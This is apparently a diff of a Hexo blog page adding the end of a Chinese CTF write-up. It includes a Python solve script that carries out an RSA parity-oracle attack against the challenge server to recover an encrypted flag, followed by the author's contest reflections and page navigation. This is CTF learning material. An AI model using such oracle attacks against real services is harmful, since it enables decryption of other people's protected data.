class="built_in">int</span>(io.recv_until(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">    <span class="keyword">if</span> sec_2 % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        sec = sec_2 // <span class="number">2</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;get sec: &#x27;</span>, sec)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    io.recv_until(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.send_line(<span class="string">b&#x27;u&#x27;</span>)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment"># io.send_line(str(sec).encode())</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parity_oracle</span>(<span class="params">n, query</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot;input: n: the modulus of the RSA</span></span><br><span class="line"><span class="string">    query: query is a function which inputs an int i, returns if the m*(2^i)%n is odd</span></span><br><span class="line"><span class="string">    return: int m</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> n &gt;&gt; i:</span><br><span class="line">        res = query(i+<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            x = <span class="number">2</span> * x + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            x = <span class="number">2</span> * x</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">        <span class="built_in">print</span>(i, x)</span><br><span class="line">    <span class="keyword">return</span> (x+<span class="number">1</span>) * n // <span class="number">2</span> ** i</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">q</span>(<span class="params">i</span>):</span><br><span class="line">    new_c = enc_flag * <span class="built_in">pow</span>(<span class="number">2</span>, i * e, nn) % nn</span><br><span class="line">    io.recv_until(<span class="string">b&#x27;&gt;&#x27;</span>)</span><br><span class="line">    io.send_line(<span class="string">b&#x27;o&#x27;</span>)</span><br><span class="line">    io.send_line(<span class="built_in">str</span>(sec).encode())</span><br><span class="line">    io.send_line(<span class="built_in">str</span>(new_c).encode())</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">int</span>(io.recv_until(<span class="string">b&#x27;\n&#x27;</span>)[:-<span class="number">1</span>].decode())</span><br><span class="line"> </span><br><span class="line">res = parity_oracle(nn, q)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"> </span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+
+<p><del>唐老板tql，唐老板ddw</del></p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>总的来说这次比赛感觉打的还不错，居然挤进了前20……甚至还抢到了一血二血 </p>
+<p>WEB太久没遇到签到了，难得一次签到题居然想偏了做了半天……（我这就爬） </p>
+<p>WEB还是得多练，原型链污染得多看看x，密码学也得加强一下(咕咕咕警告x) </p>
+<p>然后MISC真就没人做了吗……srds我感觉现在的MISC确实十分不友好</p>
+<p><img src="https://s3.xiabee.cn/pic/2023/03/211aacc7a727e86ba524ffeb145ed6740de6abd1fc64696d85be011fe8a89c39.png" alt="img"></p>
+<p>MISC居然没人做，嘤？</p>
+
+    </article>
+    <!-- license -->
     
-        
-        
-        
-        
+        <div class="license-wrapper">
+            <p>原文作者：<a href="https://blog.xiabee.cn">xiabee</a>
+            <p>原文链接：<a href="https://blog.xiabee.cn/posts/occupation-ctf-wp/">https://blog.xiabee.cn/posts/occupation-ctf-wp/</a>
+            <p>发表日期：<a href="https://blog.xiabee.cn/posts/occupation-ctf-wp/">十一月 7日 2020, 8:00:23 晚上</a>
+            <p>更新日期：<a href="https://blog.xiabee.cn/posts/occupation-ctf-wp/">三月 9日 2023, 9:08:03 晚上</a>
+            <p>版权声明：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/linux-gmp/">
-                
-                <span class="abstract-title-text">Linux安装GMP依赖</span>
-            </a>
-            <div class="abstract-content">
-                GMP简介
-官网
-GMP：GNU Multiple Precision Arithmetic Library，即GNU高精度算术运算库，在现代密码学的计算中十分关键
-
-
-什么是GMP？
-GMP是一个用于任意精度算术的免费库，可处理带符号整数，有理数和浮点数。除了运行GMP机器中的可用内存所暗示的精度外，对精度没有实际限制。GMP具有丰富的功能集，并且这些功能具有常规接口。
-GMP的主要目标应用程序是密码学应用程序和研究，Internet安全应用程序，代数系统，计算代数研究等
-GMP经过精心设计，无论是小型操作数还是大型操作数，都应尽可能快。通过使用全字作为基本算术类型，使用快速算法，针对...
-            </div>
-            <!-- read more -->
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/shodan-cam/" title="Shodan + MSF 入侵智能摄像头">
+                    <div class="nextTitle">Shodan + MSF 入侵智能摄像头</div>
+                </a>
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/09/14</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
-    
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="linux">linux</a>
-    
-</div>
-
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
-    
-        
-        
-        
-        
+        </li>
+        <li class="previous">
             
-        
-        <article class="index-post">
-            <a class="abstract-title" href="/posts/2020-summer/">
-                
-                <span class="abstract-title-text">2020 Summer Review of xiabee</span>
-            </a>
-            <div class="abstract-content">
-                有人问我最喜欢哪个季节，我觉得大概是夏季——夏季总有一些特殊的回忆：
-
-今年的我度过了一次最长的夏天——准确的来说应该是最长的假期
-0x00 前言这是我读书生涯开始以后，第一个超过六个月的“假期”……疫情宅家，几乎就没干成啥事，flag立了一堆，真正实现的貌似…….妹有吧（划掉
-来莽一眼我5月23日在popi里面的flag：“考完试想干啥”
-
-好多想干的事情呢。
-考完当即大概是吃吃吃，和cc约了吨火锅，（突然发现输入法挺懂我），然后吃完火锅可能会再约几局，把最近少吃的垃圾食品全部补会来(啊巴斯……可能会去探索一下新的吃货打卡地点√
-然后抓紧时间练车车，票圈一个个老司机横空出世，本弟弟才开...
-            </div>
-            <!-- read more -->
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/wsl2-about/" title="WSL2踩坑分享">
+                    <div class="prevTitle">WSL2踩坑分享</div>
+                </a>
             
-            <div class="abstract-post-meta">
-                <!-- date -->
-                <div class="abstract-date" title="Last updated: 2023/02/03">
-                    <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/09/05</span>
-                </div>
-                <!-- tags -->
-                
-                    <div class= abstract-tags >
+        </li>
+    </ul>
+    <!-- comment -->
     
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="碎碎念">碎碎念</a>
-    
-</div>
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
 
-                
-            </div>
-        </article>
-        <div class="index-post-divider"></div>
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+    <script src='https://utteranc.es/client.js'
+        repo='xiabee/xiabee.github.io'
+        issue-term='title'
+        label='Comment'
+        theme='github-light'
+        crossorigin='anonymous'
+        async>
+    </script>
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+            
+
+        </div>
     
-    <!-- paginator  -->
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
     
 </main>
 
@@ -628,6 +817,23 @@ GMP经过精心设计，无论是小型操作数还是大型操作数，都应�
 
         </div>
         <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#WEB"><span class="toc-number">2.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#easy-sql"><span class="toc-number">2.1.</span> <span class="toc-text">easy sql</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#easysqli"><span class="toc-number">2.2.</span> <span class="toc-text">easysqli</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Crypto"><span class="toc-number">3.</span> <span class="toc-text">Crypto</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#circuit3"><span class="toc-number">3.1.</span> <span class="toc-text">circuit3</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#crypto-lp"><span class="toc-number">3.2.</span> <span class="toc-text">crypto_lp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">4.</span> <span class="toc-text">小结</span></a></li></ol>
+            </div>
         
         <!-- sidebar -->
         <div class="sidebar sidebar-hide">
@@ -1845,6 +2051,8 @@ GMP经过精心设计，无论是小型操作数还是大型操作数，都应�
         <!-- CNZZ -->
         
         <!-- async load share.js -->
+        
+            <script src="/scripts/share.js?v=20210823" async></script>
         
         <!-- mermaid -->
         
